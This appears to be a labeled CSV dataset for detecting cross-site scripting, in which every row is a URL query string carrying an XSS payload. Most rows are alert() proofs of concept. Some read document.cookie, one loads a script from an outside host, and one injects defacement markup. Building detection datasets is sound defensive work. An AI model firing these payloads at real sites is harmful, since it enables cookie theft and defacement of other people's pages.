Payload,Label
detail=43%20Geraldton%3Cscript%3Ealert('Agd_Scorp')%3C/sc<br/>ript%3E,1
q=%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscri<br/>pt%3E&sa=Lookup,1
search=%3Cscript%3Ealert(%27xssed%27)%3C/script%3E&x=11&y=6,1
s=%27%3E%3Cscript%3Ealert(%27xssed%27)%3C/script%3E&btnSearch.x=17&<br/>btnSearch.y=11,1
"mode=allwords&search=""><script>alert(""Mor-DunyA"")</script>",1
"Lid=""><script>alert(1)</script>",1
query=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,1
q=%3C/title%3E%3Cscript%3Ealert('xss%20by%20double_check')%3C/scr<br/>ipt%3E&start=40,1
keyword=%22%2f%3e%3cscript%3ealert('xss')%3c%2fscript%3e,1
words=%27%22%3E%3C%2Ftitle%3E%3Cscr<br/>ipt%3Ealert(1337)%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3Cimg+src%3Dhttp%3A%2<br/>F%2Fwww.incident.net%2Fusers%2Freynald%2Fwp-content%2Fuploads%2F2008%2F04%2Fpekin2008.gif%3E%3C%2Fma<br/>rquee%3E%3Cimg+src%3Dhttp%3A%2F%2Fwww.incident.net%2Fusers%2Freynald%2Fwp-content%2Fuploads%2F2008%2<br/>F04%2Fpekin2008.gif%3E&search=true,1
keywords=%22%3E%3Cscript%3Ealert(%2<br/>2Eferm%20Xss%20Buldun%20:)%22)%3C/script%3E,1
action=printable&tid=5079%27%22%3E%3C/title%3E%3Cscript%3Ea<br/>lert(1337)%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3E%27%22%3E%3C/ti<br/>tle%3E%3Cscript%3Ealert(1337)%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marque<br/>e%3E,1
query=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E&type=and&resu<br/>lts=10&search=1,1
"string=<""<<sCrIpT>alert(""ohh... i think... you have an<br/>vulnerability... ESA "")</sCrIpT>",1
"pg=media&type=""><script<br/>src=http://byccc.awardspace.com/js/xssccc.js></script>",1
"view=Filter&t=""<center><BR><h1>XSS-FLAW<comment>",1
resultTypes=BL<br/>OG_POST&resultTypes=DOCUMENT&resultTypes=MESSAGE&resultTypes=BLOG&resultTypes=COMMUNITY&peopleEnable<br/>d=true&communityID=2344&q=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E%3Cmarquee%3E<br/>%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E,1
done=1&link=111-222-1933email@address.tst&name=111-222-1933email@a<br/>ddress.tst&email=111-222-1933email@address.tst&desc=%3C/textarea%3E%3CScRiPt%20%0a%0d%3Ealert(45988.<br/>6268791782)%3B%3C/ScRiPt%3E&imgid=111-222-1933email@address.tst,1
q=%3Cscript%3Ealert%28%22iBlaze%22%29%3C%2Fscr<br/>ipt%3E,1
language=fr&page=1&sort=0&againquery=%27%22%<br/>3E%3C%2Ftitle%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E<br/>%3C%2Fmarquee%3E%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXS<br/>S+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E&x=13&y=7,1
"c=</title>""><script>alert(document.cookie);</script>",1
"query=%22%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SC<br/>RIPT%3E",1
Album=%3Cscript%3Ealert(1)%3C/script%3E&NC=1&NR=6,1
"cat_ID=33&parent_ID=10&parent_name=Driverlar&sub_name<br/>=""><script>alert(""Mor-DunyA"")</script>",1
query=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E&type=and&result<br/>s=10&search=1,1
ln=fr&context=%22%3E%3Cscript%3Ealert(%22DaiMon%22)%3C/scrip<br/>t%3E,1
lang=%27%27%22%3E%3C/title%3E%3Cscript%3Ealert(13<br/>37)%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3E%22%3E%3C/title%3E%3Cs<br/>cript%3Ealert(1337)%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3Een&mar<br/>que=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL<br/>%3C/h1%3E%3C/marquee%3EDirect+access&q=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3Cm<br/>arquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3E%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1<br/>337)%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E%27%22%3E%3C%2Ftitl<br/>e%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarque<br/>e%3E&lang=en&submit1=,1
"d=""><script>alert(1);</script>",1
q=%22%3E%3Cscript%3Ealert(%22DaiMon%22)%3C/scr<br/>ipt%3E,1
"ReleaseID=374013&NewsAreaID=2&XSS""%20/><center><h1>XSS-FLAW<br/></h1><comment>",1
"do=downloads&cat=&genre=&format=&ukat=&buch=W&stream=%22%3E%3Cscript%3E<br/>alert(String.fromCharCode(107,%2073,%20110,%2071,%20111,%2070,%2099,%2072,%2097,%2079,%20115,%2032,%<br/>20105,%2083,%2032,%20100,%2065,%2032,%2098,%20101,%2083,%20116,%2032,%2070,%20117,%2099,%2075,%2032,<br/>%2084,%20104,%20101,%2032,%2082,%20101,%20115,%2084,%2033,%2033,%2033));%3C/script%3E%3C!--",1
method=and&format=normal&sort=score&config=picturealb<br/>um&restrict=entire_collection%2Fpr&exclude=&words=%3C/h3%3E%3C/div%3E%3Ch1%3EXssed%20by%20%3Cbr%3EGo<br/>oglebig.com%3C/h1%3E,1
"stat=table&country=73&page=2&phase=""><script>alert(""D<br/>aiMon"")</script>",1
q=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E%3Cmar<br/>quee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E&cmd=Search!,1
qt=%22%3E%3Ciframe%20src=javascript:alert(%27XSS?%27)%3E&se<br/>arch=1&si=1&ns=10&st=relevance&c=site&image1.x=5&image1.y=5&image1=a%2Bvalue&image1.x=0&image1.y=0,1
f_terme=%27%22%3E%3C%2Ftitle%<br/>3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%<br/>3E&lance_recherche.x=9&lance_recherche.y=14&f_synonyme=,1
fcb_sid=fcb_sid%3D6b1d71d63d43cc06c9d7c1d5063d589b<br/>&language=de&words=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E&max_per_page=10&startmonat=1&startjahr=<br/>2001&endmonat=7&endjahr=2001&subbutton=suche,1
"terms=%3Cscript%3Ealert(String.fromCharCode(88,83,83,69,68))%3C/script%<br/>3E&submit.x=22&submit.y=16",1
qu=%3Cb%3E<script>alert('hmm')</script>%3C/b%3E,1
lingua=ENG&id=21&sposta=%22%3E%3Cscript%3Ealert(%22DaiMon<br/>%22)%3C/script%3E,1
Lid=110-1698082-71200&CategoryId=BIZDIR&A<br/>ddress=1+Research+Drive&ST=MA&zip=01581%3Cscript%3Ealert(document.cookie)%3C/script%3E&flag=m,1
lServicio=Buscar&lFuncion=buscar&palabras=%22%3E%3Cscript<br/>%3Ealert(/xssed/);%3C/script%3E,1
personid=%22%3E%3Cscript%3Ealert(1)%3C/script%3E,1
apc=I----&x=%22%3E%3Cscript%3Ealert(/xssed/);%3C/scrip<br/>t%3E,1
oaparams=2__bannerid=9__zoneid=5__cb=163feb72ad__maxde<br/>st=http://www.xssed.com,1
m=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmar<br/>quee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
ID=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/scr<br/>ipt%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
ID=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarque<br/>e%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
id=%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmar<br/>quee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
id=%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/scrip<br/>t%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
aid=2575&link=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script<br/>%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
id=2&sp=%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3<br/>Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
NomVille=%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironz<br/>org%3C/h1%3E%3C/marquee%3E,1
forum_num=7%27%22%3E%3Cscript%3Ealert(1337)%3C/sc<br/>ript%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3E,1
recherche=Recher%27%22%3E%27%22%3E%3Cscript%3Ealert(1337)%3C/script<br/>%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3E%3Cscriptcher&image.x=8&image.y=7&i<br/>mage=OK,1
query=%27%22%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E%3Cmarqu<br/>ee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E&commit=Rechercher,1
REC=1&template_demo=.%2Ftemplates%2Finsa-lyon.html&site=0&path=<br/>&mode=&result_page=result.php&limite=10&option=exact&query_string=%27%22%3E%3C%2Ftitle%3E%3Cscript%3<br/>Ealert(1337)%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E,1
q=%3Cscript%3Ealert%28%2FZeryus%2F%29%3C%2F<br/>script%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E&mode=simple&num=10&as_occt=a<br/>ny&x=0&y=0&site=default_collection&sort=rel,1
p=Q&sGroupKey=maporama.fr&wold=%27%22%3E%3C%2Ftitle%3E%3Cscript<br/>%3Ealert(1337)%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E&normal.x<br/>=4&normal.y=7&normal=Search&w=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E%3Cmarque<br/>e%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E,1
